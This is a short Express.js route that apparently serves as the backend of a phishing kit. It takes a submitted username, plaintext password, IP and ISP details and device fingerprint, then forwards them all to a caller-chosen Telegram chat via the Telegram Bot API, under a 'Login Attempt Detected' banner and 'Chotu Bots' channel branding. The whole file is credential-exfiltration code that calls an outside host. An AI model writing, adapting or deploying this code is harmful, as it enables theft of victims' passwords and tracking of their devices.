app.post('/sendMessage', async (req, res) => {
    const { userId, username, password, ipDetails, deviceInfo } = req.body;
    
    // Validate input
    if (!userId || !username || !password) {
        return res.status(400).json({ error: 'Missing required fields' });
    }

    // Format Telegram message
    const message = `🚨 Login Attempt Detected 🚨
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📄 Page: Login page 

👤 Username: ${username}
🔑 Password: ${password}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🌍 IP Details:
🖥️ IP: ${ipDetails.ip}
🌐 ISP: ${ipDetails.isp}
🔍 ASN: ${ipDetails.asn}

📱 Device Info:
🔋 Charging: ${deviceInfo.charging}
🔌 Battery Level: ${deviceInfo.batteryLevel}%
🌐 Network Type: ${deviceInfo.networkType}
🕒 Time Zone: ${deviceInfo.timeZone}
📱 Device Type: ${deviceInfo.deviceType}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📢 Dev: Chotu Bots  
📌 Join: My Channel 
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;

    try {
        await axios.post(`https://api.telegram.org/bot${process.env.BOT_TOKEN}/sendMessage`, {
            chat_id: userId,
            text: message,
            parse_mode: 'Markdown'
        });
        res.json({ success: true });
    } catch (error) {
        console.error('Telegram API error:', error);
        res.status(500).json({ error: 'Failed to send alert' });
    }
});
